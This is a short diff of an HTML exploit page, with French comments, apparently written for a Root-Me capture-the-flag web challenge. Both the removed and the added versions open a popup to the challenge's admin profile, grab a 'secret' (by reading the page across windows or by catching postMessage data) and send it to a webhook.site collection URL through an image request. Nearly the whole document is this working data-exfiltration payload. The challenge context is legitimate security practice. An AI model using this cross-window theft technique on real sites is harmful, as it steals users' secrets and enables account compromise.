@@ -1,17 +1,15 @@
 <html>
 <script>
-// Ouvrir la popup après un petit délai
-setTimeout(function() {
-    var win = window.open('http://challenge01.root-me.org:58003/profile', '_blank');
-    // Attendre que la popup charge
-    setTimeout(function() {
-        try {
-            var secret = win.document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
-            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
-        } catch(e) {
-            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
-        }
-    }, 2000);
-}, 100);
+// Ouvrir la popup vers le profil de l'admin
+var win = window.open('http://challenge01.root-me.org:58003/profile');
+
+// Écouter les messages de la popup
+window.addEventListener('message', function(event) {
+    // Vérifier l'origine du message
+    if (event.origin === 'http://challenge01.root-me.org:58003') {
+        // Exfiltrer le secret
+        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(event.data);
+    }
+});
 </script>
 </html>
